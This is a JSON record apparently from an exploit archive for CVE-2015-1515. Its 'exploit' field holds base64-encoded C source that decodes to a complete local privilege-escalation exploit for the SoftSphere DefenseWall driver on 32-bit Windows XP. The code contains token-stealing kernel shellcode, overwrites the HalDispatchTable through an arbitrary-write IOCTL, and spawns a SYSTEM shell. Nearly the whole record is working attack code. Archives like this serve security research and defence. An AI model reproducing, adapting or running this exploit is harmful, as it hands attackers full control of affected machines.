{
    "source": "exploit-database", 
    "exploit": "77u/LyoNCg0KRXhwbG9pdCBUaXRsZSAgICAtIFNvZnRTcGhlcmUgRGVmZW5zZVdhbGwgRlcvSVBTIEFyYml0cmFyeSBXcml0ZSBQcml2aWxlZ2UgRXNjYWxhdGlvbg0KRGF0ZSAgICAgICAgICAgICAtIDEwdGggRmVicnVhcnkgMjAxNQ0KRGlzY292ZXJlZCBieSAgICAtIFBhcnZleiBBbndhciAoQHBhcnZlemdoaCkNClZlbmRvciBIb21lcGFnZSAgLSBodHRwOi8vd3d3LnNvZnRzcGhlcmUuY29tDQpUZXN0ZWQgVmVyc2lvbiAgIC0gMy4yNA0KRHJpdmVyIFZlcnNpb24gICAtIDMuMi4zLjAgLSBkd2FsbC5zeXMNClRlc3RlZCBvbiBPUyAgICAgLSAzMmJpdCBXaW5kb3dzIFhQIFNQMyANCk9TVkRCICAgICAgICAgICAgLSBodHRwOi8vd3d3Lm9zdmRiLm9yZy9zaG93L29zdmRiLzExNzk5Ng0KQ1ZFIElEICAgICAgICAgICAtIENWRS0yMDE1LTE1MTUNClZlbmRvciBmaXggdXJsICAgLSANCkZpeGVkIFZlcnNpb24gICAgLSBubyBmaXgNCkZpeGVkIGRyaXZlciB2ZXIgLSANCg0KKi8NCg0KDQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDx3aW5kb3dzLmg+DQoNCiNkZWZpbmUgQlVGU0laRSA0MDk2DQoNCg0KdHlwZWRlZiBzdHJ1Y3QgX1NZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT05fRU5UUlkgew0KICAgICBIQU5ETEUgIFNlY3Rpb247DQogICAgIFBWT0lEICAgTWFwcGVkQmFzZTsNCiAgICAgUFZPSUQgICBCYXNlOw0KICAgICBVTE9ORyAgIFNpemU7DQogICAgIFVMT05HICAgRmxhZ3M7DQogICAgIFVTSE9SVCAgSW5kZXg7DQogICAgIFVTSE9SVCAgTmFtZUxlbmd0aDsNCiAgICAgVVNIT1JUICBMb2FkQ291bnQ7DQogICAgIFVTSE9SVCAgUGF0aExlbmd0aDsNCiAgICAgQ0hBUiAgICBJbWFnZU5hbWVbMjU2XTsNCn0gU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTl9FTlRSWSwgKlBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OX0VOVFJZOw0KIA0KdHlwZWRlZiBzdHJ1Y3QgX1NZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT04gew0KICAgICBVTE9ORyAgIENvdW50Ow0KICAgICBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OX0VOVFJZIE1vZHVsZVsxXTsNCn0gU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTiwgKlBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OOw0KDQp0eXBlZGVmIGVudW0gX1NZU1RFTV9JTkZPUk1BVElPTl9DTEFTUyB7IA0KICAgICBTeXN0ZW1Nb2R1bGVJbmZvcm1hdGlvbiA9IDExLA0KICAgICBTeXN0ZW1IYW5kbGVJbmZvcm1hdGlvbiA9IDE2DQp9IFNZU1RFTV9JTkZPUk1BVElPTl9DTEFTUzsNCg0KdHlwZWRlZiBOVFNUQVRVUyAoV0lOQVBJICpfTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uKSgNCiAgICAgU1lTVEVNX0lORk9STUFUSU9OX0NMQVNTIFN5c3RlbUluZm9ybWF0aW9uQ2xhc3MsDQogICAgIFBWT0lEIFN5c3RlbUluZm9ybWF0aW9uLA0KICAgICBVTE9ORyBTeXN0ZW1JbmZvcm1hdGlvbkxlbmd0aCwNCiAgICAgUFVMT05HIFJldHVybkxlbmd0aCk7DQoNCnR5cGVkZWYgTlRTVEFUVVMgKFdJTkFQSSAqX050UXVlcnlJbnRlcnZhbFByb2ZpbGUpKA0KICAgICBEV09SRCBQcm9maWxlU291cmNlLCANCiAgICAgUFVMT05HIEludGVydmFsKTsNCg0KdHlwZWRlZiB2b2lkICgqRlVOQ1RQVFIpKCk7IA0KDQoNCg0KLy8gV2luZG93cyBYUCBTUDMNCg0KI2RlZmluZSBYUF9LUFJPQ0VTUyAweDQ0ICAgICAgLy8gT2Zmc2V0IHRvIF9LUFJPQ0VTUyBmcm9tIGEgX0VUSFJFQUQgc3RydWN0DQojZGVmaW5lIFhQX1RPS0VOICAgIDB4YzggICAgICAvLyBPZmZzZXQgdG8gVE9LRU4gZnJvbSB0aGUgX0VQUk9DRVNTIHN0cnVjdA0KI2RlZmluZSBYUF9VUElEICAgICAweDg0ICAgICAgLy8gT2Zmc2V0IHRvIFVuaXF1ZVByb2Nlc3NJZCBGUk9NIHRoZSBfRVBST0NFU1Mgc3RydWN0DQojZGVmaW5lIFhQX0FQTElOS1MgIDB4ODggICAgICAvLyBPZmZzZXQgdG8gQWN0aXZlUHJvY2Vzc0xpbmtzIF9FUFJPQ0VTUyBzdHJ1Y3QNCg0KDQpCWVRFIHRva2VuX3N0ZWFsX3hwW10gPQ0Kew0KICAweDUyLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gcHVzaCBlZHggICAgICAgICAgICAgICAgICAgICAgIFNhdmUgZWR4IG9uIHRoZSBzdGFjaw0KICAweDUzLAkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gcHVzaCBlYnggICAgICAgICAgICAgICAgICAgICAgIFNhdmUgZWJ4IG9uIHRoZSBzdGFjaw0KICAweDMzLDB4YzAsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8geG9yIGVheCwgZWF4ICAgICAgICAgICAgICAgICAgIGVheCA9IDANCiAgMHg2NCwweDhiLDB4ODAsMHgyNCwweDAxLDB4MDAsMHgwMCwgICAgICAgICAgICAgICAgICAgIC8vIG1vdiBlYXgsIGZzOltlYXgrMTI0aF0gICAgICAgICBSZXRyaWV2ZSBFVEhSRUFEDQogIDB4OGIsMHg0MCxYUF9LUFJPQ0VTUywgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWF4LCBbZWF4K1hQX0tQUk9DRVNTXSAgICAgUmV0cmlldmUgX0tQUk9DRVNTDQogIDB4OGIsMHhjOCwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWN4LCBlYXgNCiAgMHg4YiwweDk4LFhQX1RPS0VOLDB4MDAsMHgwMCwweDAwLCAgICAgICAgICAgICAgICAgICAgIC8vIG1vdiBlYngsIFtlYXgrWFBfVE9LRU5dICAgICAgICBSZXRyaWV2ZXMgVE9LRU4NCiAgMHg4YiwweDgwLFhQX0FQTElOS1MsMHgwMCwweDAwLDB4MDAsICAgICAgICAgICAgICAgICAgIC8vIG1vdiBlYXgsIFtlYXgrWFBfQVBMSU5LU10gPC18ICBSZXRyaWV2ZSBGTElOSyBmcm9tIEFjdGl2ZVByb2Nlc3NMaW5rcw0KICAweDgxLDB4ZTgsWFBfQVBMSU5LUywweDAwLDB4MDAsMHgwMCwgICAgICAgICAgICAgICAgICAgLy8gc3ViIGVheCwgWFBfQVBMSU5LUyAgICAgICAgIHwgIFJldHJpZXZlIF9FUFJPQ0VTUyBQb2ludGVyIGZyb20gdGhlIEFjdGl2ZVByb2Nlc3NMaW5rcw0KICAweDgxLDB4YjgsWFBfVVBJRCwweDAwLDB4MDAsMHgwMCwweDA0LDB4MDAsMHgwMCwweDAwLCAgLy8gY21wIFtlYXgrWFBfVVBJRF0sIDQgICAgICAgIHwgIENvbXBhcmVzIFVuaXF1ZVByb2Nlc3NJZCB3aXRoIDQgKFN5c3RlbSBQcm9jZXNzKQ0KICAweDc1LDB4ZTgsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gam5lICAgICAgICAgICAgICAgICAgICAgLS0tLSANCiAgMHg4YiwweDkwLFhQX1RPS0VOLDB4MDAsMHgwMCwweDAwLCAgICAgICAgICAgICAgICAgICAgIC8vIG1vdiBlZHgsIFtlYXgrWFBfVE9LRU5dICAgICAgICBSZXRyaWV2ZXMgVE9LRU4gYW5kIHN0b3JlcyBvbiBFRFgNCiAgMHg4YiwweGMxLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIG1vdiBlYXgsIGVjeCAgICAgICAgICAgICAgICAgICBSZXRyaWV2ZXMgS1BST0NFU1Mgc3RvcmVkIG9uIEVDWA0KICAweDg5LDB4OTAsWFBfVE9LRU4sMHgwMCwweDAwLDB4MDAsICAgICAgICAgICAgICAgICAgICAgLy8gbW92IFtlYXgrWFBfVE9LRU5dLCBlZHggICAgICAgIE92ZXJ3cml0ZXMgdGhlIFRPS0VOIGZvciB0aGUgY3VycmVudCBLUFJPQ0VTUw0KICAweDViLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gcG9wIGVieCAgICAgICAgICAgICAgICAgICAgICAgIFJlc3RvcmVzIGVieA0KICAweDVhLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gcG9wIGVkeCAgICAgICAgICAgICAgICAgICAgICAgIFJlc3RvcmVzIGVkeA0KICAweGMyLDB4MDggICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gcmV0IDggICAgICAgICAgICAgICAgICAgICAgICAgIEF3YXkgZnJvbSB0aGUga2VybmVsICAgIA0KfTsNCg0KDQoNCkRXT1JEIEhhbERpc3BhdGNoVGFibGVBZGRyZXNzKCkgDQp7DQogICAgX050UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbiAgICBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb247DQogICAgUFNZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT04gICBwTW9kdWxlSW5mbzsNCiAgICBEV09SRCAgICAgICAgICAgICAgICAgICAgICAgIEhhbERpc3BhdGNoVGFibGU7DQogICAgQ0hBUiAgICAgICAgICAgICAgICAgICAgICAgICBrRnVsbE5hbWVbMjU2XTsNCiAgICBQVk9JRCAgICAgICAgICAgICAgICAgICAgICAgIGtCYXNlID0gTlVMTDsNCiAgICBMUFNUUiAgICAgICAgICAgICAgICAgICAgICAgIGtOYW1lOw0KICAgIEhNT0RVTEUgICAgICAgICAgICAgICAgICAgICAgS2VybmVsOw0KICAgIEZVTkNUUFRSICAgICAgICAgICAgICAgICAgICAgSGFsOw0KICAgIFVMT05HICAgICAgICAgICAgICAgICAgICAgICAgbGVuOw0KICAgIE5UU1RBVFVTICAgICAgICAgICAgICAgICAgICAgc3RhdHVzOw0KDQoNCiAgICBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24gPSAoX050UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbilHZXRQcm9jQWRkcmVzcyhHZXRNb2R1bGVIYW5kbGUoIm50ZGxsLmRsbCIpLCAiTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uIik7DQogCQ0KICAgIGlmICghTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gVW5hYmxlIHRvIHJlc29sdmUgTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uXG5cbiIpOw0KICAgICAgICByZXR1cm4gLTE7ICANCiAgICB9DQoNCiAgICBzdGF0dXMgPSBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24oU3lzdGVtTW9kdWxlSW5mb3JtYXRpb24sIE5VTEwsIDAsICZsZW4pOw0KDQogICAgaWYgKCFzdGF0dXMpIA0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gQW4gZXJyb3Igb2NjdXJlZCB3aGlsZSByZWFkaW5nIE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbi4gU3RhdHVzID0gMHglMDh4XG5cbiIsIHN0YXR1cyk7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQoJCQ0KICAgIHBNb2R1bGVJbmZvID0gKFBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OKUdsb2JhbEFsbG9jKEdNRU1fWkVST0lOSVQsIGxlbik7DQoNCiAgICBpZihwTW9kdWxlSW5mbyA9PSBOVUxMKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gQW4gZXJyb3Igb2NjdXJyZWQgd2l0aCBHbG9iYWxBbGxvYyBmb3IgcE1vZHVsZUluZm9cblxuIik7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQoNCiAgICBzdGF0dXMgPSBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24oU3lzdGVtTW9kdWxlSW5mb3JtYXRpb24sIHBNb2R1bGVJbmZvLCBsZW4sICZsZW4pOw0KCQ0KICAgIG1lbXNldChrRnVsbE5hbWUsIDB4MDAsIHNpemVvZihrRnVsbE5hbWUpKTsNCiAgICBzdHJjcHlfcyhrRnVsbE5hbWUsIHNpemVvZihrRnVsbE5hbWUpLTEsIHBNb2R1bGVJbmZvLT5Nb2R1bGVbMF0uSW1hZ2VOYW1lKTsNCiAgICBrQmFzZSA9IHBNb2R1bGVJbmZvLT5Nb2R1bGVbMF0uQmFzZTsNCg0KICAgIHByaW50ZigiW2ldIEtlcm5lbCBiYXNlIG5hbWUgJXNcbiIsIGtGdWxsTmFtZSk7DQogICAga05hbWUgPSBzdHJyY2hyKGtGdWxsTmFtZSwgJ1xcJyk7DQoNCiAgICBLZXJuZWwgPSBMb2FkTGlicmFyeUEoKytrTmFtZSk7DQoNCiAgICBpZihLZXJuZWwgPT0gTlVMTCkgDQogICAgew0KICAgICAgICBwcmludGYoIlstXSBGYWlsZWQgdG8gbG9hZCBrZXJuZWwgYmFzZVxuXG4iKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCg0KICAgIEhhbCA9IChGVU5DVFBUUilHZXRQcm9jQWRkcmVzcyhLZXJuZWwsICJIYWxEaXNwYXRjaFRhYmxlIik7DQoNCiAgICBpZihIYWwgPT0gTlVMTCkNCiAgICB7DQogICAgICAgIHByaW50ZigiWy1dIEZhaWxlZCB0byBmaW5kIEhhbERpc3BhdGNoVGFibGVcblxuIik7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQogICAgDQogICAgcHJpbnRmKCJbaV0gSGFsRGlzcGF0Y2hUYWJsZSBhZGRyZXNzIDB4JTA4eFxuIiwgSGFsKTsJDQogICAgcHJpbnRmKCJbaV0gS2VybmVsIGhhbmRsZSAweCUwOHhcbiIsIEtlcm5lbCk7DQogICAgcHJpbnRmKCJbaV0gS2VybmVsIGJhc2UgYWRkcmVzcyAweCUwOHhcbiIsIGtCYXNlKTsgICAgICAgICAgDQoNCiAgICBIYWxEaXNwYXRjaFRhYmxlID0gKChEV09SRClIYWwgLSAoRFdPUkQpS2VybmVsICsgKERXT1JEKWtCYXNlKTsNCg0KICAgIHByaW50ZigiWytdIEtlcm5lbCBhZGRyZXNzIG9mIEhhbERpc3BhdGNoVGFibGUgMHglMDh4XG4iLCBIYWxEaXNwYXRjaFRhYmxlKTsNCg0KICAgIGlmKCFIYWxEaXNwYXRjaFRhYmxlKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gRmFpbGVkIHRvIGNhbGN1bGF0ZSBIYWxEaXNwYXRjaFRhYmxlXG5cbiIpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KDQogICAgcmV0dXJuIEhhbERpc3BhdGNoVGFibGU7DQp9DQoNCg0KaW50IEdldFdpbmRvd3NWZXJzaW9uKCkNCnsNCiAgICBpbnQgdiA9IDA7DQogICAgRFdPUkQgdmVyc2lvbiA9IDAsIG1pblZlcnNpb24gPSAwLCBtYWpWZXJzaW9uID0gMDsNCg0KICAgIHZlcnNpb24gPSBHZXRWZXJzaW9uKCk7DQoNCiAgICBtaW5WZXJzaW9uID0gKERXT1JEKShISUJZVEUoTE9XT1JEKHZlcnNpb24pKSk7DQogICAgbWFqVmVyc2lvbiA9IChEV09SRCkoTE9CWVRFKExPV09SRCh2ZXJzaW9uKSkpOw0KDQogICAgaWYgKG1pblZlcnNpb24gPT0gMSAmJiBtYWpWZXJzaW9uID09IDUpIHYgPSAxOyAgLy8gIldpbmRvd3MgWFA7DQogICAgaWYgKG1pblZlcnNpb24gPT0gMSAmJiBtYWpWZXJzaW9uID09IDYpIHYgPSAyOyAgLy8gIldpbmRvd3MgNyI7DQogICAgaWYgKG1pblZlcnNpb24gPT0gMiAmJiBtYWpWZXJzaW9uID09IDUpIHYgPSAzOyAgLy8gIldpbmRvd3MgU2VydmVyIDIwMDM7DQoNCiAgICByZXR1cm4gdjsNCn0NCg0KDQp2b2lkIHNwYXduU2hlbGwoKQ0Kew0KICAgIFNUQVJUVVBJTkZPQSBzaTsNCiAgICBQUk9DRVNTX0lORk9STUFUSU9OIHBpOw0KDQoNCiAgICBaZXJvTWVtb3J5KCZwaSwgc2l6ZW9mKHBpKSk7DQogICAgWmVyb01lbW9yeSgmc2ksIHNpemVvZihzaSkpOw0KICAgIHNpLmNiID0gc2l6ZW9mKHNpKTsNCg0KICAgIHNpLmNiICAgICAgICAgID0gc2l6ZW9mKHNpKTsgDQogICAgc2kuZHdGbGFncyAgICAgPSBTVEFSVEZfVVNFU0hPV1dJTkRPVzsNCiAgICBzaS53U2hvd1dpbmRvdyA9IFNXX1NIT1dOT1JNQUw7DQoNCiAgICBpZiAoIUNyZWF0ZVByb2Nlc3MoTlVMTCwgImNtZC5leGUiLCBOVUxMLCBOVUxMLCBUUlVFLCBDUkVBVEVfTkVXX0NPTlNPTEUsIE5VTEwsIE5VTEwsICZzaSwgJnBpKSkNCiAgICB7DQogICAgICAgIHByaW50ZigiXG5bLV0gQ3JlYXRlUHJvY2VzcyBmYWlsZWQgKCVkKVxuXG4iLCBHZXRMYXN0RXJyb3IoKSk7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICBDbG9zZUhhbmRsZShwaS5oVGhyZWFkKTsNCiAgICBDbG9zZUhhbmRsZShwaS5oUHJvY2Vzcyk7DQp9DQoNCg0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKSANCnsNCg0KICAgIF9OdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlICAgICBOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlOw0KICAgIExQVk9JRCAgICAgICAgICAgICAgICAgICAgICBpbnB1dFsxXSA9IHswfTsgICAgDQogICAgTFBWT0lEICAgICAgICAgICAgICAgICAgICAgIGFkZHJ0b3NoZWxsOw0KICAgIEhBTkRMRSAgICAgICAgICAgICAgICAgICAgICBoRGV2aWNlOw0KICAgIERXT1JEICAgICAgICAgICAgICAgICAgICAgICBkd1JldEJ5dGVzID0gMDsNCiAgICBEV09SRCAgICAgICAgICAgICAgICAgICAgICAgSGFsRGlzcGF0Y2hUYWJsZVRhcmdldDsNCiAgICBVTE9ORyAgICAgICAgICAgICAgICAgICAgICAgdGltZSA9IDA7DQogICAgdW5zaWduZWQgY2hhciAgICAgICAgICAgICAgIGRldmhhbmRsZVtNQVhfUEFUSF07IA0KDQoNCiAgICBwcmludGYoIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cbiIpOw0KICAgIHByaW50ZigiICAgIFNvZnRTcGhlcmUgRGVmZW5zZVdhbGwgRlcvSElQUyAoZHdhbGwuc3lzKSBBcmJpdHJhcnkgV3JpdGUgRW9QIEV4cGxvaXQgICAgIFxuIik7DQogICAgcHJpbnRmKCIgICAgICAgICAgICAgICAgICAgICAgICAgVGVzdGVkIG9uIFdpbmRvd3MgWFAgU1AzICgzMmJpdCkgICAgICAgICAgICAgICAgICAgICAgXG4iKTsNCiAgICBwcmludGYoIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cblxuIik7DQoNCiAgICBpZiAoR2V0V2luZG93c1ZlcnNpb24oKSA9PSAxKSANCiAgICB7DQogICAgICAgIHByaW50ZigiW2ldIFJ1bm5pbmcgV2luZG93cyBYUFxuIik7DQogICAgfQ0KDQogICAgaWYgKEdldFdpbmRvd3NWZXJzaW9uKCkgPT0gMCkgDQogICAgew0KICAgICAgICBwcmludGYoIltpXSBFeHBsb2l0IG5vdCBzdXBwb3J0ZWQgb24gdGhpcyBPU1xuXG4iKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0gIA0KDQogICAgc3ByaW50ZihkZXZoYW5kbGUsICJcXFxcLlxcJXMiLCAiZHdhbGwiKTsNCg0KICAgIE50UXVlcnlJbnRlcnZhbFByb2ZpbGUgPSAoX050UXVlcnlJbnRlcnZhbFByb2ZpbGUpR2V0UHJvY0FkZHJlc3MoR2V0TW9kdWxlSGFuZGxlKCJudGRsbC5kbGwiKSwgIk50UXVlcnlJbnRlcnZhbFByb2ZpbGUiKTsNCiAJDQogICAgaWYgKCFOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gVW5hYmxlIHRvIHJlc29sdmUgTnRRdWVyeUludGVydmFsUHJvZmlsZVxuXG4iKTsNCiAgICAgICAgcmV0dXJuIC0xOyAgDQogICAgfQ0KICAgDQogICAgYWRkcnRvc2hlbGwgPSBWaXJ0dWFsQWxsb2MoTlVMTCwgQlVGU0laRSwgTUVNX0NPTU1JVCB8IE1FTV9SRVNFUlZFLCBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFKTsNCg0KICAgIGlmKGFkZHJ0b3NoZWxsID09IE5VTEwpDQogICAgew0KICAgICAgICBwcmludGYoIlstXSBWaXJ0dWFsQWxsb2MgYWxsb2NhdGlvbiBmYWlsdXJlICUuOHhcblxuIiwgR2V0TGFzdEVycm9yKCkpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KICAgIHByaW50ZigiWytdIFZpcnR1YWxBbGxvYyBhbGxvY2F0ZWQgbWVtb3J5IGF0IDB4JS44eFxuIiwgYWRkcnRvc2hlbGwpOw0KDQogICAgbWVtc2V0KGFkZHJ0b3NoZWxsLCAweDkwLCBCVUZTSVpFKTsNCiAgICBtZW1jcHkoYWRkcnRvc2hlbGwsIHRva2VuX3N0ZWFsX3hwLCBzaXplb2YodG9rZW5fc3RlYWxfeHApKTsNCiAgICBwcmludGYoIltpXSBTaXplIG9mIHNoZWxsY29kZSAlZCBieXRlc1xuIiwgc2l6ZW9mKHRva2VuX3N0ZWFsX3hwKSk7DQoNCiAgICBoRGV2aWNlID0gQ3JlYXRlRmlsZShkZXZoYW5kbGUsIEdFTkVSSUNfUkVBRCB8IEdFTkVSSUNfV1JJVEUsIEZJTEVfU0hBUkVfUkVBRCB8IEZJTEVfU0hBUkVfV1JJVEUsIE5VTEwsIE9QRU5fRVhJU1RJTkcgLCAwLCBOVUxMKTsNCiAgICANCiAgICBpZiAoaERldmljZSA9PSBJTlZBTElEX0hBTkRMRV9WQUxVRSkNCiAgICB7DQogICAgICAgIHByaW50ZigiWy1dIENyZWF0ZUZpbGUgb3BlbiAlcyBkZXZpY2UgZmFpbGVkICglZClcblxuIiwgZGV2aGFuZGxlLCBHZXRMYXN0RXJyb3IoKSk7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQogICAgZWxzZSANCiAgICB7DQogICAgICAgIHByaW50ZigiWytdIE9wZW4gJXMgZGV2aWNlIHN1Y2Nlc3NmdWxcbiIsIGRldmhhbmRsZSk7DQogICAgfQ0KDQogICAgSGFsRGlzcGF0Y2hUYWJsZVRhcmdldCA9IEhhbERpc3BhdGNoVGFibGVBZGRyZXNzKCkgKyBzaXplb2YoRFdPUkQpOw0KICAgIHByaW50ZigiWytdIEhhbERpc3BhdGNoVGFibGUrNCAoMHglMDh4KSB3aWxsIGJlIG92ZXJ3cml0dGVuXG4iLCBIYWxEaXNwYXRjaFRhYmxlVGFyZ2V0KTsNCg0KICAgIGlucHV0WzBdID0gYWRkcnRvc2hlbGw7ICAvLyBpbnB1dCBidWZmZXIgY29udGVudHMgZ2V0cyB3cml0dGVuIHRvIG91ciBvdXRwdXQgYnVmZmVyIGFkZHJlc3MNCiAgICAgICAgICAgICAgICAgICAgDQogICAgcHJpbnRmKCJbK10gSW5wdXQgYnVmZmVyIGNvbnRlbnRzICUwOHhcbiIsIGlucHV0WzBdKTsNCiAJDQogICAgcHJpbnRmKCJbfl0gUHJlc3MgYW55IGtleSB0byBzZW5kIEV4cGxvaXQgIC4gLiAuXG4iKTsNCiAgICBnZXRjaCgpOw0KDQogICAgRGV2aWNlSW9Db250cm9sKGhEZXZpY2UsIDB4MDAyMjIwMDAsIGlucHV0LCBzaXplb2YoaW5wdXQpLCAoTFBWT0lEKUhhbERpc3BhdGNoVGFibGVUYXJnZXQsIDAsICZkd1JldEJ5dGVzLCBOVUxMKTsNCg0KICAgIHByaW50ZigiWytdIEJ1ZmZlciBzZW50XG4iKTsNCiAgICBDbG9zZUhhbmRsZShoRGV2aWNlKTsNCg0KICAgIHByaW50ZigiWytdIFNwYXduaW5nIFNZU1RFTSBTaGVsbFxuIik7DQogICAgTnRRdWVyeUludGVydmFsUHJvZmlsZSgyLCAmdGltZSk7DQogICAgc3Bhd25TaGVsbCgpOw0KDQogICAgcmV0dXJuIDA7DQp9", 
    "filename": "platforms/windows/local/36052.c", 
    "id": "36052", 
    "cves": [
        "CVE-2015-1515"
    ]
}